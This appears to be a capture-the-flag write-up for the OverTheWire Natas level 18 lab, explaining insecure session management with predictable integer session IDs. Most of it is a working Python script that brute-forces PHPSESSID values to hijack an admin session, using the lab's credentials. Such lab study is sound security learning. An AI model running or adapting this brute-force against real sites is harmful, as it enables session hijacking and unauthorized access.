# Web vulnerability
Insecure session management
# Method of solve
This application uses only integers in its session ID creation, and the valid session ID numbers only ranges from 1 to 640, which makes valid session IDs vulnerable to brute force attack. We can brute force a valid session ID in a few different ways. Here's the Python method
```
import requests

url = "http://natas18.natas.labs.overthewire.org/index.php"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")  # Replace with target creds

for session_id in range(1, 641):
    cookies = {"PHPSESSID": str(session_id)}
    response = requests.get(url, auth=auth, cookies=cookies)
    
    if "You are an admin" in response.text:
        print(f"Admin session found! PHPSESSID={session_id}")
        print(response.text)
        break
```
